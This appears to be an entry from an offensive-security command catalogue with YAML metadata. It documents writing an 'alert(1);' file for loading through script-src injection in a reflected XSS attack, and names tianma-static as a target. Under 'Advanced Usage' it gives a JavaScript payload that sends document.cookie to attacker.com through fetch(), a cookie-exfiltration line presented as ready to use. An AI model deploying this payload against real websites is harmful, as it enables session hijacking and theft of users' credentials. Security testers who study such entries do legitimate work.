---
data: echo "alert(1);" > ex
tags:
  - xss
  - file-creation
type: command
executor: bash
platforms:
  - Linux
  - macOS
id: 8ff387ea-b018-423e-b884-8d5fcfcb0e47
created_at: '2025-12-14T03:15:10.397Z'
updated_at: '2025-12-14T03:15:10.397Z'
verified: false
validated: true
submitted: true
---
# echo-create-script-file

## Command

```bash
echo "alert(1);" > ex
```

## Description

This command generates a plain text file with JavaScript code that alerts '1', intended for upload and loading via script src injection in reflected XSS scenarios, such as path manipulation in tianma-static.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `> ex` | Redirects output to create the file `ex` | Yes |
| `"alert(1);"` | JavaScript code snippet to include in the file | Yes |

## Examples

### Basic Usage

```bash
echo "alert(1);" > ex
```

### Advanced Usage

For data exfiltration:

```bash
echo "fetch('http://attacker.com?data='+document.cookie);" > payload.js
```

## Expected Output

Silent execution; file `ex` created. Check with `cat ex` to confirm content.

## Related

- [[Related Procedure: Reflected-XSS-via-Path-Injection]]
